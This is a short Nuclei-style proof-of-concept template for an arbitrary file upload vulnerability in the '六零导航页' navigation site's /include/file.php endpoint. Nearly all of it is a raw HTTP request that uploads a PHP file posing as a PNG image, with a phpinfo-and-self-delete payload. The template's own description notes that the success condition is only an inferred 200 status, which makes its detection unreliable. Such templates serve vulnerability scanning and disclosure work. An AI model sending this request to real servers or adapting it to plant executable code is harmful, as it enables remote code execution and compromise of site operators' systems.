id: poc-4058804583
info:
  name: 六零导航页 file.php 任意文件上传漏洞_gqdf7q0q7gbd80pq
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,unknown
http:
- raw:
  - 'POST /include/file.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    X-Requested-With: XMLHttpRequest

    Accept: application/json, text/javascript, */*; q=0.01

    Content-Type: multipart/form-data; boundary=---------------------------207262699182048909098055515

    Accept-Encoding: gzip, deflate, br

    -----------------------------207262699182048909098055515

    Content-Disposition: form-data; name="file"; filename="test.php"

    Content-Type: image/png

    <?php phpinfo();unlink(__FILE__);?>

    -----------------------------207262699182048909098055515--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
